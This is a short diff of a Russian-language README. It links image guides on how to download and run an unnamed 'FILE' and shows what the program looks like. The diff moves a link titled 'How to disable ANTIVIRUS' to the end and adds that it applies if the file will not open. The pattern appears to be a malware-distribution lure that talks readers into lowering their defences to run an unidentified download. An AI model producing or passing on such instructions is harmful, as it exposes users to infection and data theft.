@@ -3,8 +3,6 @@
 
 Как скачать ФАЙЛ - https://imgur.com/a/FGoN92a                                                                            
 
-Как отключить АНТИВИРУС - https://imgur.com/a/FXBImRK
-
 Как запустить ФАЙЛ - https://imgur.com/a/8k82N1C
 
 1. Скачать ФАЙЛ.
@@ -17,3 +15,5 @@
 
 
 Как выглядит программа - https://i.imgur.com/l8kdh6r.png
+
+Как отключить АНТИВИРУС - https://imgur.com/a/FXBImRK  ( Если не открывается файл )
